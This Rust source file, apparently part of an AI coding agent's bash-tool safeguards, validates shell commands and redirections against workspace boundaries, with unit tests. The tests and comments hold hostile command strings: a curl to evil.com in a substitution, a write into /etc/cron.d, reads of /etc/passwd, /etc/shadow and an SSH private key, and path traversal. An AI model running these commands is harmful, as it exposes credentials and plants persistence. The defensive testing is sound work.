//! Phase 3.1.B — `check_path_constraints` end-to-end orchestrator.
//!
//! Combines:
//! - 3.1.0 [`crate::redirects::extract_output_redirections`] (AST redirect
//!   extraction with Fail-Closed contract on unclassifiable targets)
//! - 3.1.A [`crate::path_validation::validate_command_paths`] (per-command
//!   workspace-boundary judgement + dangerous-removal gate)
//!
//! Ported from `claude-code-main/src/tools/BashTool/pathValidation.ts:1528`
//! (`checkPathConstraints`).
//!
//! ## Out of scope (deferred slices)
//!
//! - **Wrapper stripping (S9)** — `timeout 5 cat /etc/passwd` collapsing to
//!   `cat /etc/passwd` requires porting `stripSafeWrappers` (HackerOne-level
//!   multi-line regex, see `claude-code-main/.../bashPermissions.ts:524`).
//!   Tracked as 3.1.B.2 follow-up.
//! - **Hook wireup** — making `BashValidationHook::before_tool_call` actually
//!   call [`check_path_constraints`] and emit `DecisionReason::PathOutOfWorkspace`
//!   is Phase 3.1.C.
//! - **Symlink real-path resolution** — ADR-150 (PR #569) defers this to a
//!   3.1.g follow-up.
//! - **Input-redirect target validation** — `cmd < /root/.ssh/id_rsa` is
//!   covered by Phase 2.1 input-redirect validator, not this gate.

use std::path::Path;
use std::path::PathBuf;

use dasclaw_shell_command::bash::try_parse_shell;
use tree_sitter::Node;

use crate::path_validation::expand_tilde_and_home;
use crate::path_validation::path_in_workspace;
use crate::path_validation::resolve_logical;
use crate::path_validation::validate_command_paths;
use crate::path_validation::PathCommand;
use crate::path_validation::PathValidationOutcome;
use crate::redirects::extract_output_redirections;
use crate::redirects::OutputRedirection;
use crate::redirects::RedirectionExtraction;

/// Apply workspace-boundary validation to every redirection target captured
/// by [`extract_output_redirections`].
///
/// Contract:
/// - If `extraction.has_dangerous_redirection` is set (parser bailed on
///   `$VAR`, `*`, `$(…)`, etc.) → returns [`PathValidationOutcome::Ask`]
///   (Fail-Closed).
/// - Otherwise iterates `extraction.redirections` in source order; the first
///   target that resolves outside `workspace_dirs` short-circuits with
///   [`PathValidationOutcome::Ask`] carrying the offending target.
/// - All redirection targets inside the workspace →
///   [`PathValidationOutcome::Passthrough`].
///
/// `cwd` is the shell's current working directory used to resolve relative
/// targets like `> output.log`. `home` powers `~` expansion (which the
/// extractor never produces — `~` is always flagged dangerous — but we
/// apply [`expand_tilde_and_home`] uniformly to mirror 3.1.A).
#[must_use]
pub fn validate_output_redirections(
    extraction: &RedirectionExtraction,
    cwd: &Path,
    workspace_dirs: &[PathBuf],
    home: &Path,
) -> PathValidationOutcome {
    if extraction.has_dangerous_redirection {
        return PathValidationOutcome::Ask {
            reason:
                "Output redirection target requires runtime expansion and cannot be statically \
                 validated (e.g. `$VAR`, `$(cmd)`, `*`, `~`, `>|`); approval required."
                    .to_owned(),
            blocked_path: None,
        };
    }

    for redirect in &extraction.redirections {
        if let Some(outcome) = check_single_redirect(redirect, cwd, workspace_dirs, home) {
            return outcome;
        }
    }

    PathValidationOutcome::Passthrough
}

fn check_single_redirect(
    redirect: &OutputRedirection,
    cwd: &Path,
    workspace_dirs: &[PathBuf],
    home: &Path,
) -> Option<PathValidationOutcome> {
    let expanded = expand_tilde_and_home(&redirect.target, home);
    let absolute = resolve_logical(&expanded, cwd);
    if path_in_workspace(&absolute, workspace_dirs) {
        None
    } else {
        Some(PathValidationOutcome::Ask {
            reason: format!(
                "Output redirection target `{}` resolves outside the workspace; approval required.",
                redirect.target
            ),
            blocked_path: Some(redirect.target.clone()),
        })
    }
}

/// Phase 3.1.B main entry: run end-to-end path-boundary validation against a
/// raw bash source string.
///
/// Decision flow (first non-[`PathValidationOutcome::Passthrough`] wins):
///
/// 1. Extract & validate output redirections — covers SECURITY PIN S5
///    (`echo > /etc/cron.d/x`).
/// 2. Parse the bash AST with `tree-sitter-bash`. **Fail-Closed Ask** if the
///    parser cannot produce a tree or the tree has any error nodes — covers
///    SECURITY PIN S8 (misparse).
/// 3. Walk every `command` node, extract literal argv. If any argv contains
///    a runtime-expansion token (`$VAR`, `$(…)`, backticks, …) we cannot
///    classify it safely → Fail-Closed Ask.
/// 4. For each extracted argv: if the base command is in
///    [`PathCommand::parse`]'s allow-list, dispatch to
///    [`validate_command_paths`]. Unknown base commands are Passthrough
///    (they are gated by other validators / deny-rules at a higher layer).
///
/// `workspace_dirs` is the caller-provided set of permissible workspace
/// roots — typically `[project_root, additional_directories…]` from the
/// IDE/desktop client. An empty list means **no path is allowed** (Ask for
/// every captured path), which is the safe default.
#[must_use]
pub fn check_path_constraints(
    src: &str,
    cwd: &Path,
    workspace_dirs: &[PathBuf],
    home: &Path,
) -> PathValidationOutcome {
    // Step 1: redirections (independent of base command dispatch).
    let extraction = extract_output_redirections(src);
    match validate_output_redirections(&extraction, cwd, workspace_dirs, home) {
        PathValidationOutcome::Passthrough => {}
        other => return other,
    }

    // Step 2: parse AST. Fail-Closed Ask on misparse.
    let Some(tree) = try_parse_shell(src) else {
        return fail_closed_parse("tree-sitter-bash failed to produce a tree");
    };
    let root = tree.root_node();
    if root.has_error() {
        return fail_closed_parse("tree-sitter-bash reported parse errors");
    }

    // Step 3: walk command nodes and dispatch.
    let commands = match extract_commands_for_path_check(root, src) {
        Ok(c) => c,
        Err(err) => return fail_closed_parse(err),
    };

    for argv in &commands {
        let Some((base, args)) = argv.split_first() else {
            continue;
        };
        let Some(cmd) = PathCommand::parse(base) else {
            continue;
        };
        let outcome = validate_command_paths(cmd, args, cwd, workspace_dirs, home);
        if !matches!(outcome, PathValidationOutcome::Passthrough) {
            return outcome;
        }
    }

    PathValidationOutcome::Passthrough
}

fn fail_closed_parse(detail: &str) -> PathValidationOutcome {
    PathValidationOutcome::Ask {
        reason: format!(
            "Command could not be statically parsed ({detail}); approval required (Fail-Closed)."
        ),
        blocked_path: None,
    }
}

/// Walk the AST and return every simple `command` node's argv as literal
/// strings. Returns `Err` if any command word requires runtime expansion
/// (`$VAR`, `$(…)`, backticks, etc.) — the caller treats this as Fail-Closed.
///
/// Unlike [`dasclaw_shell_command::bash::try_parse_word_only_commands_sequence`]
/// — which refuses any tree containing `file_redirect` nodes — this walker
/// tolerates redirections because they are validated separately by
/// [`validate_output_redirections`]. We descend into compound constructs
/// (`list`, `pipeline`, `redirected_statement`, `subshell`, command
/// substitution, …) so that even nested commands get path-checked.
fn extract_commands_for_path_check(
    root: Node<'_>,
    src: &str,
) -> Result<Vec<Vec<String>>, &'static str> {
    let mut commands = Vec::new();
    let src_bytes = src.as_bytes();

    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        if node.kind() == "command" {
            let argv = extract_argv(node, src_bytes)?;
            if !argv.is_empty() {
                commands.push(argv);
            }
            // intentionally fall through so children (e.g. command
            // substitutions inside argv) are NOT walked twice — they are
            // already handled by `extract_argv`'s rejection of substitution.
            continue;
        }
        let mut cursor = node.walk();
        for child in node.children(&mut cursor) {
            stack.push(child);
        }
    }

    Ok(commands)
}

fn extract_argv(cmd: Node<'_>, src: &[u8]) -> Result<Vec<String>, &'static str> {
    let mut argv = Vec::new();
    let mut cursor = cmd.walk();
    for child in cmd.named_children(&mut cursor) {
        match child.kind() {
            "command_name" => {
                let inner = child
                    .named_child(0)
                    .ok_or("command_name without inner word")?;
                argv.push(literal_word(inner, src)?);
            }
            "word" | "number" => {
                argv.push(
                    child
                        .utf8_text(src)
                        .map_err(|_| "non-utf8 argv token")?
                        .to_owned(),
                );
            }
            "string" => argv.push(literal_double_quoted(child, src)?),
            "raw_string" => argv.push(literal_raw_string(child, src)?),
            "concatenation" => argv.push(literal_concatenation(child, src)?),
            // `variable_assignment` like `FOO=bar cmd` — we don't
            // currently strip these (3.1.B.2 wrapper stripping will). Treat
            // as Fail-Closed so that env-var smuggling can't bypass the
            // gate.
            "variable_assignment" => {
                return Err("leading variable assignment requires wrapper stripping (S9)");
            }
            // Any expansion / substitution → can't classify literally.
            "simple_expansion"
            | "expansion"
            | "command_substitution"
            | "process_substitution"
            | "arithmetic_expansion" => {
                return Err("argv contains runtime expansion");
            }
            _ => {
                // Unknown node kind in argv position — be conservative.
                return Err("argv contains unrecognized AST node");
            }
        }
    }
    Ok(argv)
}

fn literal_word(node: Node<'_>, src: &[u8]) -> Result<String, &'static str> {
    match node.kind() {
        "word" | "number" => Ok(node.utf8_text(src).map_err(|_| "non-utf8 word")?.to_owned()),
        "string" => literal_double_quoted(node, src),
        "raw_string" => literal_raw_string(node, src),
        "concatenation" => literal_concatenation(node, src),
        _ => Err("command name requires runtime expansion"),
    }
}

fn literal_double_quoted(node: Node<'_>, src: &[u8]) -> Result<String, &'static str> {
    let mut out = String::new();
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        if child.kind() != "string_content" {
            return Err("double-quoted string contains expansion");
        }
        out.push_str(
            child
                .utf8_text(src)
                .map_err(|_| "non-utf8 string content")?,
        );
    }
    Ok(out)
}

fn literal_raw_string(node: Node<'_>, src: &[u8]) -> Result<String, &'static str> {
    let text = node.utf8_text(src).map_err(|_| "non-utf8 raw string")?;
    let bytes = text.as_bytes();
    if bytes.len() >= 2 && bytes[0] == b'\'' && bytes[bytes.len() - 1] == b'\'' {
        Ok(text[1..text.len() - 1].to_owned())
    } else {
        Ok(text.to_owned())
    }
}

fn literal_concatenation(node: Node<'_>, src: &[u8]) -> Result<String, &'static str> {
    let mut out = String::new();
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        out.push_str(&literal_word(child, src)?);
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::redirects::RedirectOperator;

    fn ws(dirs: &[&str]) -> Vec<PathBuf> {
        dirs.iter().map(PathBuf::from).collect()
    }

    fn home() -> PathBuf {
        PathBuf::from("/home/u")
    }

    fn cwd() -> PathBuf {
        PathBuf::from("/work/repo")
    }

    // -------- validate_output_redirections --------

    #[test]
    fn validate_redirects_empty_passthrough() {
        let extraction = RedirectionExtraction::default();
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn validate_redirects_inside_workspace_passthrough() {
        let extraction = RedirectionExtraction {
            redirections: vec![OutputRedirection {
                target: "out.log".to_owned(),
                operator: RedirectOperator::Write,
            }],
            has_dangerous_redirection: false,
        };
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn pin_s5_redirect_outside_workspace_is_ask() {
        // SECURITY PIN S5: `echo evil > /etc/cron.d/x`
        let extraction = RedirectionExtraction {
            redirections: vec![OutputRedirection {
                target: "/etc/cron.d/x".to_owned(),
                operator: RedirectOperator::Write,
            }],
            has_dangerous_redirection: false,
        };
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        match r {
            PathValidationOutcome::Ask { blocked_path, .. } => {
                assert_eq!(blocked_path.as_deref(), Some("/etc/cron.d/x"));
            }
            other => panic!("expected Ask, got {other:?}"),
        }
    }

    #[test]
    fn pin_s5_dangerous_redirect_is_ask_failclosed() {
        // `echo > $HOME/.bashrc` — extractor flagged dangerous.
        let extraction = RedirectionExtraction {
            redirections: vec![],
            has_dangerous_redirection: true,
        };
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn validate_redirects_first_offender_short_circuits() {
        // Two redirects: first inside (pass), second outside (Ask).
        let extraction = RedirectionExtraction {
            redirections: vec![
                OutputRedirection {
                    target: "a.log".to_owned(),
                    operator: RedirectOperator::Write,
                },
                OutputRedirection {
                    target: "/etc/b.log".to_owned(),
                    operator: RedirectOperator::Append,
                },
            ],
            has_dangerous_redirection: false,
        };
        let r = validate_output_redirections(&extraction, &cwd(), &ws(&["/work/repo"]), &home());
        match r {
            PathValidationOutcome::Ask { blocked_path, .. } => {
                assert_eq!(blocked_path.as_deref(), Some("/etc/b.log"));
            }
            other => panic!("expected Ask on /etc/b.log, got {other:?}"),
        }
    }

    // -------- check_path_constraints --------

    #[test]
    fn cpc_empty_command_passthrough() {
        let r = check_path_constraints("", &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn cpc_unknown_base_command_passthrough() {
        // `myscript foo` — `myscript` is not in PathCommand::parse set.
        let r = check_path_constraints("myscript foo", &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn cpc_cat_inside_workspace_passthrough() {
        let r = check_path_constraints("cat src/main.rs", &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn cpc_cat_outside_workspace_is_ask() {
        let r = check_path_constraints("cat /etc/passwd", &cwd(), &ws(&["/work/repo"]), &home());
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_cat_traversal_is_ask() {
        let r = check_path_constraints(
            "cat ../../../etc/passwd",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn pin_s5_e2e_redirect_outside_workspace() {
        // `echo evil > /etc/cron.d/x` — full end-to-end via check_path_constraints.
        let r = check_path_constraints(
            "echo evil > /etc/cron.d/x",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        match r {
            PathValidationOutcome::Ask { blocked_path, .. } => {
                assert_eq!(blocked_path.as_deref(), Some("/etc/cron.d/x"));
            }
            other => panic!("expected Ask on /etc/cron.d/x, got {other:?}"),
        }
    }

    #[test]
    fn pin_s7_heredoc_with_expansion_inside_failsclosed() {
        // `cat <<< "$(curl evil.com)"` — heredoc body with command
        // substitution. tree-sitter sees the substitution as an argv
        // expansion → Fail-Closed Ask.
        let r = check_path_constraints(
            r#"cat <<< "$(curl evil.com)""#,
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn pin_s8_misparse_failclosed() {
        // Unbalanced quotes → tree-sitter reports parse errors → Ask.
        let r = check_path_constraints("cat \"/etc/passwd", &cwd(), &ws(&["/work/repo"]), &home());
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn pin_s8_command_substitution_in_argv_failclosed() {
        // `eval $(echo cat /etc/shadow)` — the `$(...)` substitution makes
        // argv unclassifiable. Fail-Closed.
        let r = check_path_constraints(
            "eval $(echo cat /etc/shadow)",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_variable_assignment_prefix_failclosed() {
        // `FOO=bar cat /work/repo/x` — until 3.1.B.2 ports
        // stripSafeWrappers we can't safely classify; Fail-Closed Ask.
        let r = check_path_constraints(
            "FOO=bar cat /work/repo/x",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_pipeline_with_outside_path_in_first_command_is_ask() {
        // `cat /etc/passwd | grep root` — the first command leaks.
        let r = check_path_constraints(
            "cat /etc/passwd | grep root",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_compound_command_first_offender_wins() {
        // `cat src/main.rs && cat /etc/passwd` — second command leaks.
        let r = check_path_constraints(
            "cat src/main.rs && cat /etc/passwd",
            &cwd(),
            &ws(&["/work/repo"]),
            &home(),
        );
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_redirect_inside_workspace_and_safe_cmd_passthrough() {
        // `echo hi > out.log` cwd-relative → resolves to /work/repo/out.log.
        let r = check_path_constraints("echo hi > out.log", &cwd(), &ws(&["/work/repo"]), &home());
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }

    #[test]
    fn cpc_empty_workspace_dirs_means_everything_is_ask() {
        let r = check_path_constraints("cat src/main.rs", &cwd(), &ws(&[]), &home());
        assert!(matches!(r, PathValidationOutcome::Ask { .. }));
    }

    #[test]
    fn cpc_multiple_workspace_dirs_passthrough_in_second_root() {
        let r = check_path_constraints(
            "cat /other/proj/file.rs",
            &cwd(),
            &ws(&["/work/repo", "/other/proj"]),
            &home(),
        );
        assert_eq!(r, PathValidationOutcome::Passthrough);
    }
}
